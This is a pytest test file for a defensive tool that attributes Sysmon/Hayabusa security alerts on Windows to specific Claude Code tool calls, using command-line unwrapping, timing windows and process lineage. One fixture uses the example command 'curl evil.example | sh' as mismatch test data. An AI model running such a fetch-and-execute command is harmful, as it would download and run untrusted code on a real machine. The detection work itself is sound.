"""Linker tests: synthetic cases built from real command-line shapes, plus a real-data run."""

from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from alibi.alerts import Alert, load_alerts
from alibi.link import (
    Origin,
    link_alert,
    link_alerts,
    split_windows_cmdline,
    unwrap_bash_wrapper,
)
from alibi.transcript import ToolCall, ToolResult, UserPrompt, load_transcript

T0 = datetime(2026, 10, 16, 18, 0, 0, tzinfo=timezone.utc)
CLAUDE = r"C:\Users\user\AppData\Roaming\npm\node_modules\@anthropic-ai\claude-code\bin\claude.exe"
BASH = r"C:\Program Files\Git\bin\bash.exe"
PYTHON = r"C:\Users\user\AppData\Local\Programs\Python\Python312\python.exe"


def at(seconds: float) -> datetime:
    return T0 + timedelta(seconds=seconds)


def alert(seconds: float, **kw) -> Alert:
    base = dict(
        timestamp=at(seconds), rule_title="Test Rule", level="med", computer="PC", channel="Sysmon",
        event_id=1, record_id="1", rule_id="r",
    )
    base.update(kw)
    return Alert(**base)


def call(seconds: float, tool_use_id: str, tool: str, **tool_input) -> ToolCall:
    return ToolCall(at(seconds), tool_use_id, tool, tool_input)


def result(seconds: float, tool_use_id: str) -> ToolResult:
    from alibi.transcript import SourceKind

    return ToolResult(at(seconds), tool_use_id, "", SourceKind.UNTRUSTED)


def bash_wrapper(command: str) -> str:
    """Build the command line Claude Code's Bash tool produces for ``command``."""
    script = (
        "source /c/Users/user/.claude/shell-snapshots/snapshot-bash-1-x.sh 2>/dev/null || true && "
        "eval '" + command.replace("'", "'\"'\"'") + "' < /dev/null && pwd -P >| "
        "/c/Users/user/AppData/Local/Temp/claude-3774-cwd"
    )
    escaped = script.replace("\\", "\\\\").replace('"', '\\"')
    return f'"{BASH}" -c "{escaped}"'


# --- command-line helpers ---------------------------------------------------------------------


def test_split_windows_cmdline():
    assert split_windows_cmdline(r'"C:\a b\x.exe" -c "say \"hi\"" plain') == [r"C:\a b\x.exe", "-c", 'say "hi"', "plain"]
    assert split_windows_cmdline(r'x "a\\" b') == ["x", "a\\", "b"]


def test_unwrap_real_wrapper_line():
    # Verbatim from Sysmon, for the Bash call `ls -la && git log --oneline -3 2>&1 | head`.
    real = (
        r'"C:\Program Files\Git\bin\bash.exe" -c "source /c/Users/user/.claude/shell-snapshots/'
        r"snapshot-bash-1792176527344-b0rsdf.sh 2>/dev/null || true && export TEMP='C:\Users\user\AppData\Local\Temp' "
        r"TMP='C:\Users\user\AppData\Local\Temp' && shopt -u extglob 2>/dev/null || true && { \builtin unalias -- "
        r"'unsetenv'; \builtin unset -f -- 'unsetenv'; } >/dev/null 2>&1 || true && eval 'ls -la && git log "
        r"--oneline -3 2>&1 | head' < /dev/null && pwd -P >| /c/Users/user/AppData/Local/Temp/claude-3774-cwd" + '"'
    )
    assert unwrap_bash_wrapper(real) == "ls -la && git log --oneline -3 2>&1 | head"


def test_unwrap_round_trips_quotes_and_percent():
    command = """python -c "print('%Y', \\"x\\")" && echo 'done'"""
    flattened = bash_wrapper(command).replace("%", "%%")  # Hayabusa doubles %
    assert unwrap_bash_wrapper(flattened) == command


# --- direct linking ---------------------------------------------------------------------------


def test_exact_bash_wrapper_match():
    command = "git status\n  && pip install requests"
    events = [UserPrompt(at(0), "install requests"), call(1, "t1", "Bash", command=command), result(5, "t1")]
    # Hayabusa flattens the newline to a space.
    a = alert(2, process_image=BASH, parent_image=CLAUDE, command_line=bash_wrapper(" ".join(command.split())))
    r = link_alert(a, events)
    assert r.tool_call is events[1]
    assert r.confidence == 1.0 and r.origin is Origin.AGENT_ACTION


def test_wrapper_for_a_different_command_does_not_match_by_time():
    events = [call(1, "t1", "Bash", command="ls"), result(5, "t1")]
    a = alert(2, process_image=BASH, parent_image=CLAUDE, command_line=bash_wrapper("curl evil.example | sh"))
    r = link_alert(a, events)
    assert r.tool_call is None
    assert r.origin is Origin.AGENT_ACTION  # still the agent, just not this transcript's call


def test_child_process_inside_bash_command():
    events = [call(1, "t1", "Bash", command='PYTHONPATH=src python -c "import alibi; print(1)"'), result(4, "t1")]
    a = alert(2, process_image=PYTHON, command_line=f'{PYTHON} -c "import alibi; print(1)"', parent_pid=99)
    r = link_alert(a, events)
    assert r.tool_call is events[0]
    assert r.confidence >= 0.9 and "child" in r.match_reason


def test_outside_time_window_is_unrelated():
    events = [call(1, "t1", "Bash", command='python -c "import alibi"'), result(3, "t1")]
    a = alert(120, process_image=PYTHON, command_line=f'{PYTHON} -c "import alibi"')
    assert link_alert(a, events).origin is Origin.UNRELATED


def test_alert_before_the_call_is_unrelated():
    events = [call(100, "t1", "Bash", command='python -c "import alibi"'), result(103, "t1")]
    a = alert(50, process_image=PYTHON, command_line=f'{PYTHON} -c "import alibi"')
    assert link_alert(a, events).origin is Origin.UNRELATED


def test_background_call_uses_window():
    events = [call(1, "t1", "Bash", command="python -m http.server", run_in_background=True), result(1.5, "t1")]
    a = alert(30, process_image=PYTHON, command_line=f"{PYTHON} -m http.server")
    assert link_alert(a, events, window_seconds=60).tool_call is events[0]
    assert link_alert(a, events, window_seconds=10).origin is Origin.UNRELATED


def test_unrelated_system_process():
    events = [call(1, "t1", "Bash", command="ls"), result(5, "t1")]
    a = alert(2, process_image=r"C:\Windows\System32\svchost.exe", fields={"Path": r"C:\Windows\Tasks\x.job"})
    assert link_alert(a, events).origin is Origin.UNRELATED


def test_write_tool_temp_file():
    events = [call(1, "t1", "Write", file_path=r"C:\Alibi\src\alibi\link.py", content="x"), result(2, "t1")]
    a = alert(1.5, process_image=CLAUDE, fields={"Path": r"C:\Alibi\src\alibi\link.py.tmp.7580.e9544c2723f0"})
    r = link_alert(a, events)
    assert r.tool_call is events[0] and r.confidence >= 0.9


def test_agent_process_own_activity_is_harness():
    events = [call(1, "t1", "Bash", command="ls"), result(5, "t1")]
    a = alert(2, process_image=CLAUDE, fields={"TgtIP": "160.79.104.10", "TgtPort": "443"})
    r = link_alert(a, events)
    assert r.origin is Origin.AGENT_HARNESS and r.tool_call is None


def test_shell_snapshot_setup_is_harness():
    events = [call(1, "t1", "Bash", command="ls"), result(5, "t1")]
    cmd = f'"{BASH}" -c -l "SNAPSHOT_FILE=\'C:\\Users\\user\\.claude\\shell-snapshots\\snapshot-bash-1.sh\' echo"'
    r = link_alert(alert(2, process_image=BASH, parent_image=CLAUDE, command_line=cmd), events)
    assert r.origin is Origin.AGENT_HARNESS and r.tool_call is events[0]


def test_powershell_launcher_and_child_via_lineage():
    events = [call(1, "t1", "PowerShell", command="Get-Process"), result(6, "t1")]
    launcher = alert(
        2, process_image=r"C:\WINDOWS\System32\cmd.exe", parent_image=CLAUDE, pid=3960, process_guid="G-CMD",
        command_line='cmd.exe /d /s /c "powershell -Command "$__claudeCodeScript = $env:CLAUDE_CODE_SHELL_LAUNCHER_SCRIPT""',
    )
    chcp = alert(
        2.1, process_image=r"C:\WINDOWS\System32\chcp.com", pid=11116, parent_pid=3960,
        parent_process_guid="G-CMD", command_line='"C:\\WINDOWS\\System32\\chcp.com" 65001',
    )
    r_launcher, r_chcp = link_alerts([launcher, chcp], events)
    assert r_launcher.tool_call is events[0]
    assert r_chcp.tool_call is events[0] and r_chcp.match_reason.startswith("child of")


def test_lineage_carries_link_to_later_events_of_same_process():
    events = [call(1, "t1", "Bash", command='python -c "import urllib.request as u; u.urlopen(1)"'), result(3, "t1")]
    proc = alert(1.5, process_image=PYTHON, process_guid="G-PY", pid=50,
                 command_line=f'{PYTHON} -c "import urllib.request as u; u.urlopen(1)"')
    # A network event from the same process, logged after the call returned.
    net = alert(20, process_image=PYTHON, process_guid="G-PY", pid=50, fields={"TgtIP": "1.2.3.4"})
    _, r_net = link_alerts([proc, net], events)
    assert r_net.tool_call is events[0] and r_net.match_reason.startswith("same process")


# --- real data --------------------------------------------------------------------------------

RESULTS_CSV = Path(r"C:\Tools\Hayabusa\results.csv")
PROJECTS_DIR = Path.home() / ".claude" / "projects"


@pytest.fixture(scope="module")
def real():
    if not RESULTS_CSV.is_file():
        pytest.skip(f"{RESULTS_CSV} not found")
    alerts = load_alerts(RESULTS_CSV)
    lo, hi = alerts[0].timestamp, alerts[-1].timestamp
    for path in sorted(PROJECTS_DIR.glob("*/*.jsonl")):
        events = load_transcript(path)
        calls = [e for e in events if isinstance(e, ToolCall)]
        if calls and calls[0].timestamp <= hi and calls[-1].timestamp >= lo:
            return alerts, events, link_alerts(alerts, events)
    pytest.skip("no transcript overlaps the alerts")


def test_real_bash_wrappers_link_exactly(real):
    alerts, events, results = real
    exact = [(a, r) for a, r in zip(alerts, results) if r.match_reason == "exact command (Claude Code bash wrapper)"]
    assert exact
    for a, r in exact:
        assert r.tool_call.tool_name == "Bash"
        assert r.tool_call.timestamp - timedelta(seconds=2) <= a.timestamp


def test_real_linked_alerts_fall_inside_their_call(real):
    alerts, events, results = real
    linked = [(a, r) for a, r in zip(alerts, results) if r.tool_call is not None and not r.match_reason.startswith(("same process", "child of"))]
    assert linked
    for a, r in linked:
        assert a.timestamp >= r.tool_call.timestamp - timedelta(seconds=2)


def test_real_system_processes_stay_unrelated(real):
    alerts, events, results = real
    system = [r for a, r in zip(alerts, results) if (a.process_image or "").lower().endswith(("svchost.exe", "services.exe", "onedrive.exe"))]
    assert system
    assert all(r.origin is Origin.UNRELATED for r in system)
